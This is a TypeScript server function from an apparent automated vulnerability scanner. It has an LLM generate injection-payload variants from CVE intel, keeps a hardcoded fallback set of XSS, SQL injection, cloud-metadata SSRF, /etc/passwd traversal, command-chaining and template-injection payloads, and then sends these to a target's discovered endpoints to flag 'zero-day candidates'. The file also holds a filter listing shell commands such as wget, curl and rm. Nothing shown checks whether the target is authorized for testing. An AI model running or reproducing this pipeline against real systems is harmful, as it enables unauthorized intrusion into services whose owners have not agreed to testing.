// Pillar 4: Zero-day variant generator from CVE root-cause patterns.
// MVP+: enqueues per-variant test jobs through scan_jobs (streams progress to Mythos tab).
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
  try {
    const { targetId, runId, cveIds } = await req.json();
    if (!targetId) throw new Error("targetId required");

    const db = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);

    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "thought",
      message: `🌀 Variant Gen: pulling CVE root-cause patterns from intel feeds`,
      metadata: { phase: "variant-intel-pull", run_id: runId },
    });

    let intel: any[] = [];
    // Gap 8: track CVEs already seen in this run via mythos_runs.thought_log → exclude on the next pull.
    const { data: runRow } = await db.from("mythos_runs").select("thought_log").eq("id", runId).maybeSingle();
    const seenIds = new Set<string>();
    for (const entry of (runRow?.thought_log as any[] | null) || []) {
      if (entry?.kind === "variant-cve-pulled" && Array.isArray(entry.ids)) for (const id of entry.ids) seenIds.add(id);
    }
    if (cveIds?.length) {
      const fresh = (cveIds as string[]).filter((id) => !seenIds.has(id));
      const ids = fresh.length ? fresh : (cveIds as string[]); // fall back to original if fully exhausted
      const { data } = await db
        .from("intel_feeds")
        .select("title,vulnerability_class,extracted_payloads,raw_summary,report_id")
        .in("report_id", ids)
        .limit(15);
      intel = data || [];
    } else {
      // exclude seen via .not("report_id","in",...) requires SQL syntax; we filter client-side
      const { data } = await db
        .from("intel_feeds")
        .select("title,vulnerability_class,extracted_payloads,raw_summary,report_id")
        .eq("status", "processed")
        .order("ingested_at", { ascending: false })
        .limit(40);
      intel = (data || []).filter((r: any) => !seenIds.has(r.report_id)).slice(0, 5);
      // If exhausted, rotate window
      if (intel.length === 0) {
        const offset = seenIds.size % 20;
        const { data: d2 } = await db
          .from("intel_feeds")
          .select("title,vulnerability_class,extracted_payloads,raw_summary,report_id")
          .eq("status", "processed")
          .order("ingested_at", { ascending: false })
          .range(offset, offset + 4);
        intel = d2 || [];
      }
    }
    // Persist the IDs we just selected so the NEXT iteration excludes them.
    const pulledIds = intel.map((r: any) => r.report_id).filter(Boolean);
    if (pulledIds.length && runId) {
      const newLog = [
        ...((runRow?.thought_log as any[] | null) || []),
        { ts: new Date().toISOString(), kind: "variant-cve-pulled", ids: pulledIds },
      ];
      await db.from("mythos_runs").update({ thought_log: newLog }).eq("id", runId);
    }

    const { data: endpoints } = await db
      .from("discovered_endpoints")
      .select("url,method,parameters")
      .eq("target_id", targetId)
      .limit(60);

    // Fix #14 — pre-flight HEAD against the first endpoint; if unreachable, skip inline tests entirely
    let targetReachable = true;
    if (endpoints?.[0]?.url) {
      try {
        const head = await fetch(endpoints[0].url, {
          method: "HEAD",
          signal: AbortSignal.timeout(10000),
          redirect: "manual",
        });
        targetReachable = head.status > 0 && head.status < 600;
      } catch {
        targetReachable = false;
      }
      if (!targetReachable) {
        await db.from("scan_logs").insert({
          target_id: targetId,
          log_type: "info",
          message: `🌐 Variant Gen: target unreachable via HEAD — skipping inline tests, only queueing for worker retry`,
          metadata: { phase: "variant-preflight-fail", run_id: runId },
        });
      }
    }

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY not configured");

    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "action",
      message: `🧬 Variant Gen: asking LLM for root-cause variants from ${intel.length} CVEs`,
      metadata: { phase: "variant-llm-call", run_id: runId },
    });

    const aiResp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${LOVABLE_API_KEY}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are a zero-day researcher. Generate variant payloads as CONCRETE HTTP ATTACK STRINGS ONLY.

Rules:
- variant_payload MUST be a raw injectable HTTP string under 100 characters.
- Valid examples: '../etc/passwd', '{{7*7}}', '%00admin', '<svg onload=alert(1)>', "' OR 1=1--", 'http://169.254.169.254/'.
- NEVER output shell commands (no 'ln -s', 'cp', 'rm', 'cat', 'sudo', 'wget'), filesystem paths to write to (/tmp/, /var/www/), prose sentences, or pseudocode like create_symlink(...).
- If the attack cannot be expressed as a raw injectable string, skip it.

Given a known CVE, identify its ROOT-CAUSE PATTERN, then return 3-5 novel variant payloads targeting the same root cause class.`,
          },
          { role: "user", content: `Known intel:\n${JSON.stringify(intel).slice(0, 4000)}\n\nGenerate variants.` },
        ],
        tools: [
          {
            type: "function",
            function: {
              name: "generate_variants",
              description: "Return zero-day variant payloads",
              parameters: {
                type: "object",
                properties: {
                  variants: {
                    type: "array",
                    items: {
                      type: "object",
                      properties: {
                        parent_cve: { type: "string" },
                        vuln_class: { type: "string" },
                        root_cause_pattern: { type: "string" },
                        variant_payload: { type: "string" },
                        variant_rationale: { type: "string" },
                      },
                      required: [
                        "parent_cve",
                        "vuln_class",
                        "root_cause_pattern",
                        "variant_payload",
                        "variant_rationale",
                      ],
                      additionalProperties: false,
                    },
                  },
                },
                required: ["variants"],
                additionalProperties: false,
              },
            },
          },
        ],
        tool_choice: { type: "function", function: { name: "generate_variants" } },
      }),
    });

    let args: any = { variants: [] };
    if (!aiResp.ok) {
      // 🔄 DEGRADED MODE — credits/quota exhausted. Fall back to deterministic
      // mutation set so the kill-path keeps running instead of crashing.
      await db
        .from("scan_logs")
        .insert({
          target_id: targetId,
          log_type: "warn",
          message: `🪫 Variant-Gen AI ${aiResp.status} — switching to deterministic mutation set (no-AI mode)`,
          metadata: { phase: "variant-degraded", run_id: runId, status: aiResp.status },
        })
        .then(
          () => {},
          () => {},
        );
      const DETERMINISTIC: Array<{
        vuln_class: string;
        variant_payload: string;
        root_cause_pattern: string;
        variant_rationale: string;
      }> = [
        {
          vuln_class: "xss",
          variant_payload: `"><svg/onload=alert('CYBERSCOPE_PROVEN')>`,
          root_cause_pattern: "reflected-svg",
          variant_rationale: "Bypasses naive < filter",
        },
        {
          vuln_class: "xss",
          variant_payload: `<details open ontoggle=alert('CYBERSCOPE_PROVEN')>`,
          root_cause_pattern: "reflected-details",
          variant_rationale: "HTML5 tag rarely blocked",
        },
        {
          vuln_class: "sqli",
          variant_payload: `' OR '1'='1'-- -`,
          root_cause_pattern: "auth-bypass",
          variant_rationale: "Classic tautology",
        },
        {
          vuln_class: "sqli",
          variant_payload: `' UNION SELECT NULL,version()-- -`,
          root_cause_pattern: "union-leak",
          variant_rationale: "Version disclosure",
        },
        {
          vuln_class: "ssrf",
          variant_payload: `http://169.254.169.254/latest/meta-data/`,
          root_cause_pattern: "cloud-meta",
          variant_rationale: "AWS IMDSv1",
        },
        {
          vuln_class: "lfi",
          variant_payload: `../../../../etc/passwd`,
          root_cause_pattern: "path-traversal",
          variant_rationale: "Linux passwd",
        },
        {
          vuln_class: "cmdi",
          variant_payload: `;echo CYBERSCOPE_PROVEN;`,
          root_cause_pattern: "cmd-chain",
          variant_rationale: "Deterministic proof",
        },
        {
          vuln_class: "ssti",
          variant_payload: `{{7*7}}__CYBERSCOPE__`,
          root_cause_pattern: "template-eval",
          variant_rationale: "Jinja/Twig",
        },
      ];
      args = { variants: DETERMINISTIC.map((v) => ({ parent_cve: "GENERIC", ...v })) };
    } else {
      const aiData = await aiResp.json();
      args = JSON.parse(aiData.choices?.[0]?.message?.tool_calls?.[0]?.function?.arguments || "{}");
    }
    // Drop shell commands, prose, pseudocode, and oversized blobs.
    const isValidVariantPayload = (p: unknown): p is string => {
      if (typeof p !== "string") return false;
      const s = p.trim();
      if (!s || s.length > 300) return false;
      // Shell command prefixes
      if (/^(ln\s|cp\s|mv\s|rm\s|cat\s|sudo\s|bash\s|sh\s|chmod\s|chown\s|wget\s|curl\s)/i.test(s)) return false;
      // Prose starters
      if (/^(an?\s|the\s|this\s|that\s|when\s|if\s)/i.test(s)) return false;
      // Action verbs in prose
      if (/\battempts to\b|\bwill\s|\bshould\s|\bcan\s|\bwould\s/i.test(s)) return false;
      // Filesystem write hints
      if (s.includes("/tmp/") || s.includes("/var/www/") || s.includes("/var/backups/")) return false;
      // Pseudocode markers
      if (/copyfile|create_symlink|pseudocode/i.test(s)) return false;
      // Long natural-language sentences without injection-like punctuation
      const words = s.split(/\s+/);
      const hasInjectionChars = /[<>'"`{}\\;|&=()$]|%[0-9a-f]{2}|\.\.\//i.test(s);
      if (words.length > 8 && !hasInjectionChars) return false;
      return true;
    };
    const rawVariants = (args.variants || []).filter((v: any) => isValidVariantPayload(v?.variant_payload));
    const dropped = (args.variants || []).length - rawVariants.length;
    if (dropped > 0) {
      await db.from("scan_logs").insert({
        target_id: targetId,
        log_type: "info",
        message: `🛡️ Variant filter dropped ${dropped} invalid LLM outputs (prose/shell/oversize)`,
        metadata: { phase: "variant-filter", run_id: runId, dropped },
      });
    }
    const variants = rawVariants.slice(0, 20);

    // Insert variants as "queued" — actual testing is queued as scan_jobs
    const variantRecords: any[] = [];
    for (const v of variants) {
      const usableEndpoint =
        (endpoints || []).find((e) => {
          if (!e.url) return false;
          try {
            const u = new URL(e.url);
            // prefer endpoints with query params already
            if (u.searchParams.size > 0) return true;
            if (e.parameters && Object.keys(e.parameters as object).length > 0) return true;
            return false;
          } catch {
            return false;
          }
        }) ?? endpoints?.[0]; // fall back to first if nothing has params

      const ep = usableEndpoint?.url ?? null;
      const paramName = usableEndpoint?.parameters
        ? Object.keys(usableEndpoint.parameters as Record<string, string>)[0] || "q"
        : "q";
      const { data: inserted } = await db
        .from("mythos_variants")
        .insert({
          run_id: runId ?? null,
          target_id: targetId,
          parent_cve: v.parent_cve,
          vuln_class: v.vuln_class,
          root_cause_pattern: v.root_cause_pattern,
          variant_payload: v.variant_payload,
          variant_rationale: v.variant_rationale,
          test_endpoint: ep,
          test_status: "queued",
          test_result: {},
          is_zero_day_candidate: false,
        })
        .select()
        .single();
      if (inserted) variantRecords.push({ ...inserted, _paramName: paramName });
    }

    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: "result",
      message: `🧬 Variant Gen: ${variants.length} variants generated, queueing tests`,
      metadata: { phase: "variant-generated", run_id: runId, count: variants.length },
    });

    // Queue per-variant test jobs — deduped by variantId (30-min window).
    const { enqueueJobs } = await import("../_shared/enqueue.ts");
    const jobs = variantRecords
      .filter((v) => v.test_endpoint)
      .map((v) => ({
        target_id: targetId,
        job_type: "variant_test",
        priority: 6,
        payload: {
          variantId: v.id,
          payload: v.variant_payload,
          endpoint: v.test_endpoint,
          paramName: v._paramName,
          vulnClass: v.vuln_class,
        },
        dedupWindowMs: 30 * 60_000,
        dedupExtraKey: v.id,
      }));
    if (jobs.length) await enqueueJobs(db, jobs);

    // Also run inline tests for first 3 — only if pre-flight reachability passed
    let immediateCandidates = 0;
    if (targetReachable) {
      for (const v of variantRecords.slice(0, 8)) {
        if (!v.test_endpoint) continue;
        try {
          const u = new URL(v.test_endpoint);
          u.searchParams.set(v._paramName, v.variant_payload);
          const r = await fetch(u.toString(), {
            signal: AbortSignal.timeout(12000),
            redirect: "manual", // ← don't silently lose the payload
          });

          // Handle redirect manually:
          if (r.status >= 300 && r.status < 400) {
            const loc = r.headers.get("location");
            if (loc) {
              const dest = new URL(loc, u.toString());
              dest.searchParams.set(v._paramName, v.variant_payload);
              const r2 = await fetch(dest.toString(), { signal: AbortSignal.timeout(8000) });
              const body = await r2.text();
              const reflected = body.includes(v.variant_payload);
              const errorSig = /SQL|syntax error|stack trace|TypeError|fatal error/i.test(body);
              // use reflected/errorSig for isCand check below
            }
            continue;
          }
          const body = await r.text();
          const reflected = body.includes(v.variant_payload);
          const errorSig = /SQL|syntax error|stack trace|undefined|TypeError|fatal error/i.test(body);
          const isCand = reflected || errorSig;
          if (isCand) immediateCandidates++;
          await db
            .from("mythos_variants")
            .update({
              test_status: isCand ? "candidate" : "negative",
              test_result: { status: r.status, bodyLen: body.length, reflected, errorSig },
              is_zero_day_candidate: isCand,
            } as any)
            .eq("id", v.id);
        } catch {
          /* leave as queued */
        }
      }
    }

    await db.from("scan_logs").insert({
      target_id: targetId,
      log_type: immediateCandidates > 0 ? "result" : "info",
      message: `🌀 Variant Gen done: ${variants.length} variants, ${immediateCandidates} immediate 0-day candidates, ${jobs.length} queued for follow-up`,
      metadata: { phase: "variant-complete", run_id: runId, candidates: immediateCandidates, queued: jobs.length },
    });

    return new Response(
      JSON.stringify({ variantsCount: variants.length, candidates: immediateCandidates, queued: jobs.length }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  } catch (e) {
    console.error(e);
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : String(e) }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
